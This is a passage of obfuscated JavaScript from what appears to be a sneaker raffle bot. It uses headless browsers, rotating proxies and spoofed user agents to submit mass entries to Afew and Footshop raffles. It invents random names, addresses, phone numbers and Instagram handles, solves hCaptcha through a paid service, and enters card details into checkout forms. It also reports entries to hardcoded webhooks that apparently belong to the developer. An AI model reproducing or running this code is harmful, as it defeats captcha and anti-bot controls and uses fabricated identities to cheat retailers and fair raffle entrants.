    _0x1e1197[0x0] == 'RANDOM' ? _0x1e1197[0x0] = '' + _0x4fc551['first']() + _0x4fc551['last']() + '@' : _0x1e1197[0x0] = _0x1e1197[0x0] + '@';
    _0x13ff97[_0x52855d]['Email'] = _0x1e1197['join'](''), _0x13ff97[_0x52855d]['Address1'] = _0x1fb101['join'](''), _0x13ff97[_0x52855d]['Address2'] = _0x36bf09['join']('');
    _0x13ff97[_0x52855d]['Phone'] == 'RANDOM' && (_0x13ff97[_0x52855d]['Phone'] = '0' + _0x578d31(0x5f5e100, 0x3b9ac9ff));
    if (_0x13ff97[_0x52855d]['Follower'] == 'RANDOM') {
        var _0x16f6cd = _0x578d31(0x1, 0x270f);
        _0x13ff97[_0x52855d]['Follower'] = '' + _0x4fc551['first']() + _0x4fc551['last']() + _0x16f6cd + '\x20';
    }
    _0x13ff97[_0x52855d]['HouseNumber'] == 'RANDOM' && (_0x13ff97[_0x52855d]['HouseNumber'] = _0x578d31(0x1, 0xc8));
    if (_0x13ff97[_0x52855d]['Address1'] == 'RANDOM') {
        var _0x3e1dd2 = Math['round'](Math['random']() * (_0x475c22['length'] - 0x1)), _0x345dd0 = _0x422ff8[_0x3e1dd2];
        _0x13ff97[_0x52855d]['Address1'] = _0x4fc551['last']() + 'straat', _0x13ff97[_0x52855d]['Zip'] == '' && (_0x13ff97[_0x52855d]['Postcode'] = _0x578d31(0x3e8, 0x270f) + '\x20' + _0x345dd0 + _0x345dd0, _0x13ff97[_0x52855d]['Zip'] = _0x13ff97[_0x52855d]['Postcode']), _0x13ff97[_0x52855d]['HouseNumber'] = '' + _0x578d31(0x1, 0xc8);
    }
    return;
}
;
function _0x240e91() {
    let _0x4b0d4b = proxyFile['split']('\x0a'), _0x12b08c = _0x4b0d4b['map']((_0x50f619, _0x3d9716) => {
        sanatizeProxy = _0x50f619['replace']('\x0d', '');
        if (_0x4b0d4b[_0x3d9716 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x12b08c;
}
;
async function _0x1bad40(_0x58bae3) {
    var _0x1f4aef = _0x58bae3[0x1]['split'](':');
    const _0x5b8979 = await _0x479f93['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x1f4aef[0x0] + ':' + _0x1f4aef[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x4038aa = await _0x5b8979['newPage']();
        await _0x4038aa['authenticate']({
            'username': '' + _0x1f4aef[0x2],
            'password': '' + _0x1f4aef[0x3]
        }), console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x4038aa['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4038aa['setRequestInterception'](!![]), _0x4038aa['on']('request', _0x3e4d9e => {
            _0x3e4d9e['resourceType']() === 'image' || _0x3e4d9e['resourceType']() === 'font' || _0x3e4d9e['resourceType']() === 'media' ? _0x3e4d9e['abort']() : _0x3e4d9e['continue']();
        }), await _0x4038aa['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x4038aa['waitForTimeout'](0xbb8), await _0x4038aa['waitForSelector']('.product-card');
        const _0x37a893 = await _0x4038aa['$$eval']('a.product-card', _0x3c71ea => {
            return _0x3c71ea['map'](_0x5065ed => _0x5065ed['href']);
        });
        return _0x5e9464 = _0x37a893;
    } catch (_0x4e2916) {
        console['log']('\x20' + _0x4e2916);
    } finally {
        _0x5b8979['close'](), console['clear']();
    }
}
;
async function _0x572e47(_0x136ac9, _0x1481a9, _0x56a6dd, _0x582eaf, _0x323350) {
    _0x1481a9 != 'ver' && await _0x58b1b9(_0x582eaf, _0x136ac9);
    if (_0xff80bf['useRandomProxy'] = ![])
        var _0x3e713e = _0x323350[_0x136ac9]['split'](':');
    else
        var _0x31ba4a = Math['round'](Math['random']() * (_0x323350['length'] - 0x1)), _0x3e713e = _0x323350[_0x31ba4a]['split'](':');
    var _0xb0b97b = _0x56a6dd['data'];
    _0x1481a9 != 'ver' && (_0xb0b97b['data']['attributes']['properties']['$first_name'] = '' + _0x582eaf[_0x136ac9]['FirstName'], _0xb0b97b['data']['attributes']['properties']['$last_name'] = '' + _0x582eaf[_0x136ac9]['LastName'], _0xb0b97b['data']['attributes']['properties']['$address1'] = _0x582eaf[_0x136ac9]['Address1'] + '\x20' + _0x582eaf[_0x136ac9]['HouseNumber'] + '\x20' + _0x582eaf[_0x136ac9]['Address2'], _0xb0b97b['data']['attributes']['properties']['$zip'] = '' + _0x582eaf[_0x136ac9]['Zip'], _0xb0b97b['data']['attributes']['properties']['$city'] = '' + _0x582eaf[_0x136ac9]['City'], _0xb0b97b['data']['attributes']['properties']['$country'] = '' + _0x582eaf[_0x136ac9]['Country'], _0xb0b97b['data']['attributes']['properties']['Size'] = '' + _0x582eaf[_0x136ac9]['Size'], _0xb0b97b['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x582eaf[_0x136ac9]['Follower'], _0x1481a9 == 'exp' ? _0xb0b97b['data']['attributes']['email'] = '' + _0x582eaf[_0x136ac9]['FirstName'] + _0x582eaf[_0x136ac9]['LastName'] + _0xff80bf['catchall'] : _0xb0b97b['data']['attributes']['email'] = '' + _0x582eaf[_0x136ac9]['Email']);
    var _0x20dc1d = {
        'jar': _0x7dd18d,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x56a6dd['url'],
        'headers': _0x56a6dd['headers'],
        'body': JSON['stringify'](_0xb0b97b),
        'proxy': 'http://' + _0x3e713e[0x2] + ':' + _0x3e713e[0x3] + '@' + _0x3e713e[0x0] + ':' + _0x3e713e[0x1]
    };
    return _0x1481a9 === 'ver' && (_0x20dc1d['method'] = 'GET'), new Promise(function (_0x3c1d93, _0x485a73) {
        callback = async (_0x134875, _0x451ae2, _0x2326be) => {
            if (!_0x134875 && _0x451ae2['statusCode'] == 0xca || !_0x134875 && _0x451ae2['statusCode'] == 0xc8) {
                _0x3c1d93(console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x56a6dd['name'] + ']\x20Task\x20' + (_0x136ac9 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x1481a9 != 'ver') {
                    var _0x31f569 = await _0x2df3ee(_0x582eaf[_0x136ac9], _0x56a6dd, 'dev', ![]), _0x21d3f0 = await _0x2df3ee(_0x582eaf[_0x136ac9], _0x56a6dd, 'pub', ![]);
                    const _0x127647 = {
                        'succesDEVMSG': { 'embeds': [_0x31f569] },
                        'succesPUBMSG': { 'embeds': [_0x21d3f0] }
                    };
                    if (_0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '')
                        try {
                            await _0x2110d2(_0xff80bf['webhook'], _0x127647['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x127647['succesDEVMSG']), await _0x4a79d2(0xc8);
                    try {
                        await _0x2110d2(_0x19d1c2, _0x127647['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x1481a9 == 'ver') {
                        var _0x31f569 = await _0x2df3ee(null, _0x56a6dd, 'ver', ![]);
                        const _0x57e651 = {
                            'succesDEVMSG': { 'embeds': [_0x31f569] },
                            'succesPUBMSG': { 'embeds': [_0x21d3f0] }
                        };
                        await _0x2110d2(_0x157a45, _0x57e651['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x1481a9 != 'ver') {
                    var _0x3c309e = '' + _0x134875, _0xeb15c1 = await _0x2df3ee(_0x582eaf[_0x136ac9], _0x56a6dd, 'dev', !![], _0x3c309e), _0x4ec745 = {};
                    _0x4ec745['errorDEV'] = { 'embeds': [_0xeb15c1] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x4ec745['errorDEV']), await _0x2110d2(_0x132dc8, _0x4ec745['errorDEV']);
                }
                _0x485a73(console['log'](_0x49028e() + '\x20[' + _0x56a6dd['name'] + ']\x20Task\x20' + (_0x136ac9 + 0x1) + ':\x20' + _0x134875));
            }
        };
        try {
            _0x1481a9 === 'ver' ? console['log'](_0x49028e() + '\x20[' + _0x56a6dd['name'] + ']\x20Task\x20' + (_0x136ac9 + 0x1) + ':\x20Verifying.') : console['log'](_0x49028e() + '\x20[' + _0x56a6dd['name'] + ']\x20Task\x20' + (_0x136ac9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xb0b97b['data']['attributes']['email']), _0x11451f(_0x20dc1d, callback);
        } catch (_0x4edea5) {
            console['log'](_0x49028e() + '\x20Task\x20' + (_0x136ac9 + 0x1) + ':\x20' + _0x4edea5);
        }
    });
}
;
async function _0x2cd91b(_0x2db08e, _0x2aa31d, _0xded14e) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x585928 = 0x0; _0x585928 < _0x2db08e['length']; _0x585928++) {
        var _0xe6f173, _0x43a8e3 = '', _0x16a914 = 0x0, _0x16d689 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2db08e[_0x585928]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2db08e[_0x585928]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49c529
                }
            ]
        }], _0x3a4704 = await _0x2df3ee(_0x2db08e[_0x585928], _0xded14e, 'dev', ![]), _0x3f9d56 = await _0x2df3ee(_0x2db08e[_0x585928], _0xded14e, 'pub', ![]);
        const _0x3d6e6e = {
            'succesDEVMSG': { 'embeds': [_0x3a4704] },
            'succesPUBMSG': { 'embeds': [_0x3f9d56] }
        }, _0x14353d = { 'embeds': _0x16d689 };
        await _0x58b1b9(_0x2db08e, _0x585928);
        if (_0x2db08e[_0x585928]['Email'] == '' || _0x2db08e[_0x585928]['FirstName'] == '' || _0x2db08e[_0x585928]['LastName'] == '' || _0x2db08e[_0x585928]['Country'] == '' || _0x2db08e[_0x585928]['Size'] == '' || _0x2db08e[_0x585928]['Address1'] == '' || _0x2db08e[_0x585928]['Zip'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2db08e[_0x585928]['Email'] == '' || _0x2db08e[_0x585928]['FirstName'] == '' || _0x2db08e[_0x585928]['LastName'] == '' || _0x2db08e[_0x585928]['Country'] == '' || _0x2db08e[_0x585928]['Size'] == '' || _0x2db08e[_0x585928]['Address1'] == '' || _0x2db08e[_0x585928]['Zip'] == '' || _0x2db08e[_0x585928]['Phone'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x2812be = '' + _0x2db08e[_0x585928]['Url'];
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x2e176e = _0x2aa31d[_0x585928]['split'](':');
        else
            var _0x2c9a36 = Math['round'](Math['random']() * (_0x2aa31d['length'] - 0x1)), _0x2e176e = _0x2aa31d[_0x2c9a36]['split'](':');
        const _0x49cebd = await _0x479f93['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x2e176e[0x0] + ':' + _0x2e176e[0x1]]
        });
        try {
            const _0x67d3de = await _0x49cebd['newPage']();
            await _0x67d3de['authenticate']({
                'username': '' + _0x2e176e[0x2],
                'password': '' + _0x2e176e[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x67d3de['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x67d3de['setRequestInterception'](!![]), _0x67d3de['on']('request', _0x363a21 => {
                _0x363a21['resourceType']() === 'image' || _0x363a21['resourceType']() === 'font' || _0x363a21['resourceType']() === 'media' ? _0x363a21['abort']() : _0x363a21['continue']();
            }), await _0x67d3de['goto'](_0x2812be), await _0x4a79d2(0xbb8), await _0x67d3de['waitForSelector']('.control__JhutY'), await _0x67d3de['click']('.control__JhutY'), await _0x4a79d2(0x1f4);
            if (_0x2db08e[_0x585928]['Size'] != 'RANDOM')
                try {
                    const _0x2a8bc2 = await _0x67d3de['$x']('//div[contains(text(),\x20\x27' + _0x2db08e[_0x585928]['Size'] + '\x27)]');
                    await _0x2a8bc2[0x0]['click']();
                } catch {
                    console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x4fa2f8 = await _0x67d3de['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x175c28 = Math['round'](Math['random']() * (_0x4fa2f8['length'] - 0x1));
                await _0x4fa2f8[_0x175c28]['click']();
            }
            await _0x4a79d2(0x4b0);
            const _0x542d37 = await _0x67d3de['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x542d37[0x0]['click'](), await _0x67d3de['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x67d3de['type']('input[name=\x22email\x22]', '' + _0x2db08e[_0x585928]['Email']), await _0x4a79d2(0x640), await _0x67d3de['type']('input[name=\x22phone\x22]', '' + _0x2db08e[_0x585928]['Phone']), await _0x4a79d2(0x4b0), await _0x67d3de['click']('button.btn.continue-button__1RtsS'), await _0x4a79d2(0x4b0);
            try {
                await _0x67d3de['type']('input[name=\x22firstName\x22]', '' + _0x2db08e[_0x585928]['FirstName']), await _0x4a79d2(0x258);
            } catch {
                const _0x456d4a = await _0x67d3de['$$eval']('.invalid-feedback\x20>\x20div', _0x3f42c3 => {
                    return _0x3f42c3['map'](_0x57fd3c => _0x57fd3c['innerText']);
                });
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20' + _0x456d4a));
                continue;
            }
            await _0x67d3de['type']('input[name=\x22lastName\x22]', '' + _0x2db08e[_0x585928]['LastName']), await _0x4a79d2(0xc8), await _0x67d3de['type']('input[name=\x22instagramUsername\x22]', '' + _0x2db08e[_0x585928]['Follower']), await _0x4a79d2(0x4b0), await _0x67d3de['click']('button.btn.continue-button__1RtsS'), await _0x4a79d2(0x3e8), console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x67d3de['select']('select[name=\x22country\x22]', '' + _0x2db08e[_0x585928]['Country']), await _0x4a79d2(0x2bc), await _0x67d3de['type']('input[name=\x22streetName\x22]', '' + _0x2db08e[_0x585928]['Address1']), await _0x4a79d2(0x258), await _0x67d3de['type']('input[name=\x22houseNumber\x22]', _0x2db08e[_0x585928]['HouseNumber'] + '\x20' + _0x2db08e[_0x585928]['Address2']), await _0x4a79d2(0xc8), await _0x67d3de['type']('input[name=\x22postalCode\x22]', '' + _0x2db08e[_0x585928]['Zip']), await _0x4a79d2(0x1f4), await _0x67d3de['type']('input[name=\x22city\x22]', '' + _0x2db08e[_0x585928]['City']), await _0x4a79d2(0x4b0), await _0x67d3de['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x4a79d2(0x4b0), await _0x67d3de['click']('button.btn.continue-button__1RtsS'), await _0x4a79d2(0x4b0), console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x67d3de['solveRecaptchas'](), console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x4a79d2(0xbb8), await _0x67d3de['click']('button.btn.continue-button__1RtsS'), await _0x4a79d2(0x1388), console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x67d3de['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x67d3de['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4a79d2(0x4b0), await _0x67d3de['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x2db08e[_0x585928]['CardNumber']), await _0x4a79d2(0x320), await _0x67d3de['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x67d3de['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x2db08e[_0x585928]['ExpiryDate']), await _0x4a79d2(0x4b0), await _0x67d3de['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x67d3de['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x2db08e[_0x585928]['CVV']), await _0x4a79d2(0x226), await _0x67d3de['type']('input[name=\x22holderName\x22]', '' + _0x2db08e[_0x585928]['NameOnCard']), await _0x4a79d2(0x226), await _0x67d3de['click']('button.adyen-checkout__button'), console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x67d3de['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x4a79d2(0xbb8);
            } catch (_0x58530c) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x203DS\x20Failed')), _0xe6f173 = '3DS\x20Error\x20' + _0x58530c;
                var _0x27f442 = await _0x2df3ee(_0x2db08e[_0x585928], _0xded14e, 'dev', !![], _0xe6f173);
                _0x3d6e6e['errorDEV'] = { 'embeds': [_0x27f442] };
                _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x3d6e6e['errorDEV']);
                await _0x2110d2(_0x132dc8, _0x3d6e6e['errorDEV']);
                continue;
            }
            console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '')
                try {
                    await _0x2110d2(_0xff80bf['webhook'], _0x3d6e6e['succesDEVMSG']);
                } catch {
                }
            await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x3d6e6e['succesDEVMSG']), await _0x4a79d2(0xc8);
            try {
                await _0x2110d2(_0x19d1c2, _0x3d6e6e['succesPUBMSG']);
            } catch {
            }
        } catch (_0x5be94e) {
            console['log'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20' + _0x5be94e), _0xe6f173 = '' + _0x5be94e;
            var _0x27f442 = await _0x2df3ee(_0x2db08e[_0x585928], _0xded14e, 'dev', !![], _0xe6f173);
            _0x3d6e6e['errorDEV'] = { 'embeds': [_0x27f442] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x3d6e6e['errorDEV']), await _0x2110d2(_0x132dc8, _0x3d6e6e['errorDEV']), _0x43a8e3 = 'yes';
        } finally {
            _0x49cebd['close']();
            if (_0x43a8e3 == 'yes' && _0x16a914 != 0x5) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xded14e['name'] + ']\x20Task\x20' + (_0x585928 + 0x1) + '\x20:\x20Retrying')), _0x585928 = _0x585928 - 0x1, _0x16a914 = _0x16a914 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xff80bf['footshopDelay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['footshopDelay']);
        }
    }
}
afewFunction = async (_0x1a48ea, _0xdc8094, _0x33ca75, _0x31c597, _0x58c904) => {
    for (var _0x4c3999 = 0x0; _0x4c3999 < _0x31c597['length']; _0x4c3999++) {
        _0xff80bf['AfewDelay'] = _0xff80bf['delay'];
        var _0x54431e, _0x3ee6fb = '', _0x21c648 = 0x0;
        _0x31c597[_0x4c3999]['Url'] = _0x1a48ea, _0x1dc4b6(_0x33ca75['name'] + '\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20/\x20' + _0x31c597['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0x31c597, _0x4c3999);
        var _0x148846 = await _0x2df3ee(_0x31c597[_0x4c3999], _0x33ca75, 'dev', ![]), _0xc0e112 = await _0x2df3ee(_0x31c597[_0x4c3999], _0x33ca75, 'pub', ![]);
        const _0x5e34a4 = {
            'succesDEVMSG': { 'embeds': [_0x148846] },
            'succesPUBMSG': { 'embeds': [_0xc0e112] }
        };
        if (_0x31c597[_0x4c3999]['Email'] == '' || _0x31c597[_0x4c3999]['FirstName'] == '' || _0x31c597[_0x4c3999]['LastName'] == '' || _0x31c597[_0x4c3999]['Country'] == '' || _0x31c597[_0x4c3999]['Size'] == '' || _0x31c597[_0x4c3999]['Address1'] == '' || _0x31c597[_0x4c3999]['Zip'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x5d69b3 = _0x58c904[_0x4c3999]['split'](':');
        else
            var _0x3a4d39 = Math['round'](Math['random']() * (_0x58c904['length'] - 0x1)), _0x5d69b3 = _0x58c904[_0x3a4d39]['split'](':');
        const _0x4532d2 = await _0x479f93['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5d69b3[0x0] + ':' + _0x5d69b3[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5e903a = await _0x4532d2['newPage']();
            await _0x5e903a['setDefaultNavigationTimeout'](0x1d4c0), await _0x5e903a['authenticate']({
                'username': '' + _0x5d69b3[0x2],
                'password': '' + _0x5d69b3[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5e903a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5e903a['setRequestInterception'](!![]), _0x5e903a['on']('request', _0x4a1553 => {
                _0x4a1553['resourceType']() === 'image' || _0x4a1553['resourceType']() === 'font' || _0x4a1553['resourceType']() === 'media' ? _0x4a1553['abort']() : _0x4a1553['continue']();
            }), await _0x5e903a['goto'](_0x1a48ea, { 'waitUntil': 'networkidle2' }), console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x5e903a['waitForTimeout'](0xfa0), console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x5e903a['waitForTimeout'](0x320);
            if (_0x31c597[_0x4c3999]['Size'] == 'RANDOM') {
                console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x81d73a = await _0x5e903a['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x498d38 => {
                    return _0x498d38['map'](_0x141a41 => _0x141a41['href']);
                });
                var _0x66154c = Math['round'](Math['random']() * (_0x81d73a['length'] - 0x1));
                await _0x5e903a['goto']('' + _0x81d73a[_0x66154c]);
            } else {
                console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x31c597[_0x4c3999]['Size']);
                try {
                    const _0x312ee2 = await _0x5e903a['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x31c597[_0x4c3999]['Size'] + '\x22]\x20>\x20a', _0x403ee4 => {
                        return _0x403ee4['map'](_0x5ace3e => _0x5ace3e['href']);
                    });
                    await _0x5e903a['goto']('' + _0x312ee2[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x4eb429) {
                    console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20' + _0x4eb429 + '\x20Size\x20not\x20found')), _0x54431e = 'Size\x20Not\x20Found';
                    var _0x573346 = await _0x2df3ee(_0x31c597[_0x4c3999], _0x33ca75, 'dev', !![], _0x54431e);
                    _0x5e34a4['errorDEV'] = { 'embeds': [_0x573346] };
                    _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x5e34a4['errorDEV']);
                    await _0x2110d2(_0x132dc8, _0x5e34a4['errorDEV']);
                    continue;
                }
            }
            await _0x5e903a['waitForTimeout'](0x258), await _0x5e903a['type']('#raffle-instagram', '' + _0x31c597[_0x4c3999]['Follower'], { 'delay': 0x64 }), await _0x5e903a['waitForTimeout'](0x384), await _0x5e903a['click']('#raffle-terms'), await _0x5e903a['waitForTimeout'](0x384), await _0x5e903a['evaluate'](() => {
                const _0x2879c1 = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x2879c1['click']();
            }), await _0x5e903a['waitForTimeout'](0xbb8), await _0x5e903a['waitForSelector']('#checkout_email'), await _0x4a79d2(0x3e8), console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Filling\x20Information');
            _0xdc8094 == 'sec' ? await _0x5e903a['type']('#checkout_email', '' + _0x31c597[_0x4c3999]['FirstName'] + _0x31c597[_0x4c3999]['LastName'] + _0xff80bf['catchall'], 0x32) : await _0x5e903a['type']('#checkout_email', '' + _0x31c597[_0x4c3999]['Email'], 0x32);
            await _0x4a79d2(0x320), await _0x5e903a['select']('#checkout_shipping_address_country', '' + _0x31c597[_0x4c3999]['Country']), await _0x5e903a['waitForTimeout'](0x258), await _0x5e903a['type']('#checkout_shipping_address_first_name', '' + _0x31c597[_0x4c3999]['FirstName']), await _0x5e903a['waitForTimeout'](0x320), await _0x5e903a['type']('#checkout_shipping_address_last_name', '' + _0x31c597[_0x4c3999]['LastName']), await _0x5e903a['waitForTimeout'](0x2bc), await _0x5e903a['type']('#checkout_shipping_address_address1', _0x31c597[_0x4c3999]['Address1'] + '\x20' + _0x31c597[_0x4c3999]['HouseNumber']), await _0x5e903a['waitForTimeout'](0x2bc), await _0x5e903a['type']('#checkout_shipping_address_address2', '' + _0x31c597[_0x4c3999]['Address2']), await _0x5e903a['waitForTimeout'](0x2bc);
            _0x31c597[_0x4c3999]['Postcode'] == undefined ? await _0x5e903a['type']('#checkout_shipping_address_zip', '' + _0x31c597[_0x4c3999]['Zip']) : await _0x5e903a['type']('#checkout_shipping_address_zip', '' + _0x31c597[_0x4c3999]['Postcode']);
            await _0x5e903a['waitForTimeout'](0x2bc), await _0x5e903a['type']('#checkout_shipping_address_city', '' + _0x31c597[_0x4c3999]['City']), await _0x5e903a['waitForTimeout'](0x2bc), console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x5e903a, _0x5e903a['evaluate'](() => {
                const _0x53e156 = document['querySelector']('#continue_button');
                for (var _0x1daa36 = 0x0; _0x1daa36 < 0x5; _0x1daa36++) {
                    if (_0x53e156) {
                        _0x53e156['click'](), _0x53e156['click']();
                        break;
                    } else
                        _0x4a79d2(0xfa0);
                }
            }), await _0x5e903a['waitForTimeout'](0x1194);
            try {
                await _0x5e903a['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x5e903a['evaluate'](() => {
                const _0x46b6c0 = document['querySelector']('#continue_button');
                for (var _0x439d28 = 0x0; _0x439d28 < 0x5; _0x439d28++) {
                    if (_0x46b6c0) {
                        _0x46b6c0['click']();
                        break;
                    } else
                        _0x4a79d2(0xfa0);
                }
